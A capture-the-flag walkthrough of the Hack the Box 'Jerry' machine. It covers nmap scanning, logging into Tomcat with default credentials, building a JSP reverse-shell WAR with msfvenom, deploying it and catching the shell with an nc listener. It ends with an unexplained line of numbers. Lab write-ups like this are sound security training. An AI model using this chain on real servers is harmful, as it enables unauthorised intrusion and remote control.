# Walkthrough of Jerry Machine – Hack the Box:
1. In a new terminal window, run `nmap -sC -sV 10.10.10.95`
	* `-sC`: Adds on the "default" scripts to be run which include things like "Speed", "usefulness", and "Intrusiveness". You can check them out in more detail by looking under *"default"* in the **Script Categories** section on [this website](https://nmap.org/book/nse-usage.html)
	* `-sV`: Probe open ports to determine service/version info
![image](https://user-images.githubusercontent.com/44144070/90194000-0d2d2600-dd7b-11ea-95bb-7876faf2f160.png)
2. It looks like we only have one open port (8080) and it's running a service called **Apache Tomcat/Coyote JSP engine 1.1**
3. If we do a little research we find out a few things:
	* **Apache Tomcat** is [a "pure Java" HTTP web server environment in which Java code can run](https://en.wikipedia.org/wiki/Apache_Tomcat)
	* **Coyote** [is a Connector component for Tomcat that supports the HTTP 1.1 protocol as a web server](https://en.wikipedia.org/wiki/Apache_Tomcat#Coyote)
3. Being that **Apache Tomcat** (or **Tomcat** for short) provides a web-server environment, we can actually go to the website and see it.
4. Let's check it out by going to *http://10.10.10.95:8080*
	* This URL works because we know from the portscan that **Tomcat** is an http service, so we add the *"http://"* at the beginning followed by the HTB IP address, and then the *":8080"* allows us to specify the port number. All of this works together to say we want to go to the IP address *10.10.10.95* via an *http* connection at port *8080*
1. Once we get there we can see a few things:
![image](https://user-images.githubusercontent.com/44144070/90194129-6301ce00-dd7b-11ea-9ced-6de716eaae9f.png)
1. If we explore around, most of the clickable options redirect us to help pages for how to use **Tomcat**, with the exception of the *Server Status*, *Manager App*, and *Host Manager*. If we click on any of those three we get this pop-up:
![](https://user-images.githubusercontent.com/44144070/90194521-5d58b800-dd7c-11ea-83e6-e5d31cadc18c.png)
1. So it's asking us for credentials that we don't know. Before trying to set up any complicated password breaking attacks, I find it a good idea to try at least a few of the basics. Some of these include *admin:admin*, *admin:password*, *admin:pass*, etc, (where *admin* stands for *administrator* in the hopes that with these credentials we can log into the account with the most privileges
2. If we try *admin:admin* on the *Server Status* feature it works! And we end up looking at a page like this:
![](https://user-images.githubusercontent.com/44144070/90194585-7e210d80-dd7c-11ea-841d-bdb63ee97243.png)
1. This page has a bunch of information about **Tomcat** and this particular server it's running on. Unfortunately, aside from telling us a little bit more about the server, it doesn't help us get any closer finding a vulnerability
2. Lets go back and try a different option to see if we can find something more useful. If we go back to the main page and click on *Manager App* however, we get this 403 error message (you may have also gotten a similar 401 error message earlier if you had clicked *Cancel* or exited out of the username password prompt):
	* The 401 error is a result of the website thinking we are attempting to access a page without giving credentials when we exit out of the login pop-up, and the 403 error is when we are logged in with credentials, but then try and access a page that we don't have privileges to
![](https://user-images.githubusercontent.com/44144070/90194659-985aeb80-dd7c-11ea-9e8a-7baee5498d7c.png)
1. This error message is very interesting though, if we read it, we find that it gives us instructions on how to set up a manager account, with example credentials *tomcat:s3cret*. Now what often happens is that people will follow these instructions exactly (same way you might go about changing a password for a website), however, if the service doesn't check for (or the user doesn't remember to change) the example credentials, then we may be able to use them to sign into our administrator account
1. To be able to try this new idea though, we first need to be able to get our pop-up back to retry our credentials, and as you probably noticed, **Tomcat** will only show us error messages instead. To fix this, we need to go to *Preferences* -> *Privacy & Security* -> *History* and clear our history (there should be options as to how far back you want to erase your history if you don't want to delete everything):
![](https://user-images.githubusercontent.com/44144070/90194719-bd4f5e80-dd7c-11ea-8481-5a6832331cfd.png)
	* The reason this works, is because every time we attempt to log in, the website takes our credentials, encodes them, and puts them in what's called a "header". This header is read by the website and if it matches the proper credentials, then it will allow us to access the content. If it doesn't match, then the website will react with an error message. Most browsers save our most recent credentials or headers on websites, so by clearing our history, we can clear them which allows us to try again.
4. Once we've done that, we can go back, click on *Manager App* and our pop-up is back!
5. If we try *tomcat:s3cret* it works and we get this page:
![](https://user-images.githubusercontent.com/44144070/90194758-d35d1f00-dd7c-11ea-808c-aef11f8837b5.png)
6. If we explore around a little we'll find a section called *"WAR file to deploy"*, and this is what we're going to want to look at, because chances are if we have the ability to upload something, we can make that something do what we want
![](https://user-images.githubusercontent.com/44144070/90194805-ecfe6680-dd7c-11ea-8743-f0b840a6c14c.png)
	* So what even is a WAR file?
		* A WAR (Web Application Resource) file is like a ZIP file in the sense that it is actually a collection of other files compressed together. However unlike ZIP files, WAR files are comprised solely of [JAR](https://en.wikipedia.org/wiki/JAR_(file_format)) files meant to hold resources to create a website
9. Now before we start trying to write our own WAR file, lets check if we have any tools that might have something already written
10. One way we can check is by using a program called **MsfVenom**, a payload generator for **Metasploit**
11. Since we know WAR files are a collection of JSP/Java files, lets see what payload options  **MsfVenom** has with `msfvenom -l payloads | grep java`
	* The `msfvenom -l payloads` will list all of the payloads **MsfVenom** can produce, but since there are so many we'll want to reduce our results by pipelining the results through `grep java` which filters all the results and shows us only the ones with the word "java" in it
![](https://user-images.githubusercontent.com/44144070/90194897-1ae3ab00-dd7d-11ea-8596-af7405e332d4.png)
12. Taking a look at these results, we can narrow it down by figuring out what else we want, JSP (because it's a WAR file), a reverse shell (check out the first bit of [this article](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9) to understand why), and a tcp connection (as we determined from our portscan). This leaves us with the *"java/jsp_shell_reverse_tcp"* option
13. To create our WAR file to upload to **Tomcat**, we'll run `msfvenom -p java/jsp_shell_reverse_tcp LHOST=yourHtbIp LPORT=openPort -f war > aName.war`. Now that's a big command with a lot of fill-in-the-blanks so let's break it down:
	* `msfvenom`: We are using **MsfVenom** to create our program and this calls it
	* `-p java/jsp_shell_reverse_tcp`: This indicates that we want to create a <ins>**p**</ins>ayload in *java* that will create a *JSP Reverse Shell* using a *TCP* connection
	* `LHOST=yourHtbIp`: Setting the local host by replacing "yourHtbIp" with your Hack the Box IP (can be found in the **Access** tab when signed into your HTB account)
	* `LPORT=openPort`: Setting the port to be used for the reverse shell connection
	* `-f war`: Setting the <ins>**f**</ins>ormat of the payload to be a WAR file
	* `> aName.war`: Replace "aName" with whatever you want to name your payload file
1. You'll want to run your version of the command, and after a few moments you'll get a message saying the size of the file, and if we type `ls` we can see our file!
![](https://user-images.githubusercontent.com/44144070/90195123-8d548b00-dd7d-11ea-8e9f-ab9c211396e3.png)
11. So let's go ahead and upload our WAR file to **Tomcat** by clicking *"Browse"* in the *"WAR file to deploy"* section, and once we see our file in there, click *"Deploy"*
![](https://user-images.githubusercontent.com/44144070/90195193-ad844a00-dd7d-11ea-8818-d64676277795.png)
1. If you did it right, you should see your file sorted in alphabetically with the other preexisting files:
![](https://user-images.githubusercontent.com/44144070/90195220-bbd26600-dd7d-11ea-9d35-9c0a13684bc1.png)
2. Before we do anything with it though, since we learned a Reverse Shell relies on a "listener" running on our device for our victim to connect to with a shell, we need to set up a listener with `nc -lvnp yourLPORT`
	* `-lvnp` is short for `-l -v -n -p` and specifies four things:
		* `-l`: Listen for incoming traffic
		* `-v`: Be verbose (give details of what is going on in the process)
		* `-n`: No DNS lookups are required (it saves time and makes the command simpler)
		* `-p`: Specifies a specific port to be listening on (which is why you need to put an open port after to be listening on)
12. Once we do that, we should get this response showing that our "listener" is ready
![](https://user-images.githubusercontent.com/44144070/90195262-d86e9e00-dd7d-11ea-8a05-c4e79114cbe1.png)
13. Let's go ahead and activate our WAR file by clicking on it in **Tomcat**, and if we check our listener, we have a shell!
![](https://user-images.githubusercontent.com/44144070/90195317-f50ad600-dd7d-11ea-89fa-bb44e930cd29.png)
1. Since we're in a new shell, we'll want to check out the *help* page to see what the commands are by running `help`
![](https://user-images.githubusercontent.com/44144070/90195340-0522b580-dd7e-11ea-935d-8235bb2c27dc.png)
14. We can see all of the commands and what they do in this shell, the main ones that concern us will be that the command `dir` replaces `ls` and `cat` is replaced with `type`
15. If we navigate around using these commands, we'll find a file in *Users/Administrator/Desktop/flags* called *"2 for the price of 1.txt"*
![](https://user-images.githubusercontent.com/44144070/90195404-25eb0b00-dd7e-11ea-9184-ac1fbf931ffc.png)
16. If we run `type "2 for the price of 1.txt"`, then we can see our user and root hashes and enter them to get our points!


## Resources
- [Official Jerry Writeup from Hack the Box](https://www.hackthebox.eu/home/machines/writeup/144)
- [Jerry Video Tutorial from IppSec](https://youtu.be/PJeBIey8gc4)
- [Jerry Write-Up by 0xRick](https://0xrick.github.io/hack-the-box/jerry/)
- [`nmap` Command Help](https://nmap.org/book/man-briefoptions.html)
- [Information on Apache Tomcat](https://en.wikipedia.org/wiki/Apache_Tomcat)
- [Information on NetCat Commands](https://www.varonis.com/blog/netcat-commands/)
- [Information on WAR files](https://en.wikipedia.org/wiki/WAR_(file_format))


###### <font size="1">78 97 39 77 104 111 105 39 67 104 98 32 116 39 111 98 102 99 39 116 119 107 110 115 116 39 104 119 98 105 39 102 105 99 39 102 39 82 65 72 39 116 111 104 114 107 99 39 97 107 126 39 104 114 115 43 39 78 39 112 102 105 115 39 126 104 114 39 115 104 39 111 102 113 98 39 98 127 119 98 100 115 98 99 39 110 115</font>